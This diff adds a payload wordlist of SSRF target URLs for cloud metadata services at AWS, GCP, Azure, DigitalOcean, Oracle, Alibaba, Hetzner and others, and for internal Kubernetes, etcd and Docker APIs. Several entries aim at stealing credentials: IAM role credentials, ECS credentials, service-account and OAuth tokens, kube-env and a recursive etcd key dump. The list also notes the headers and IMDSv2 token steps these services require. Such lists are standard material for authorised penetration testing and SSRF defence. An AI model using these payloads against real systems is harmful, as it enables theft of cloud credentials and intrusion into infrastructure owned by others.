@@ -1,0 +1,77 @@
+# Cloud Metadata SSRF URLs — SOTA
+# Source: PayloadsAllTheThings/SSRF-Cloud-Instances.md, hackingthe.cloud, PortSwigger
+
+# === AWS ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://[fd00:ec2::254]/latest/meta-data/
+http://instance-data/latest/meta-data/
+
+# AWS IMDSv2 (two-step — use in script, not single URL)
+# PUT http://169.254.169.254/latest/api/token  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+# GET http://169.254.169.254/latest/meta-data/  Header: X-aws-ec2-metadata-token: TOKEN
+
+# AWS ECS credentials
+http://169.254.170.2/v2/credentials/
+http://169.254.170.2/v2/credentials/UUID
+
+# AWS Lambda runtime API
+http://localhost:9001/2018-06-01/runtime/invocation/next
+http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
+
+# === GCP ===
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+# Header required: Metadata-Flavor: Google
+
+# === Azure ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+# Header required: Metadata: true
+
+# === DigitalOcean ===
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+
+# === Oracle Cloud ===
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/user-data/
+
+# === Alibaba ===
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+
+# === Hetzner ===
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+
+# === OpenStack ===
+http://169.254.169.254/openstack
+
+# === Kubernetes ===
+http://127.0.0.1:2379/version
+http://127.0.0.1:2379/v2/keys/?recursive=true
+http://kubernetes.default.svc/api/v1/namespaces
+
+# === Docker ===
+http://127.0.0.1:2375/v1.24/containers/json
+http://127.0.0.1:2375/version
+
+# === Rancher ===
+http://rancher-metadata/latest
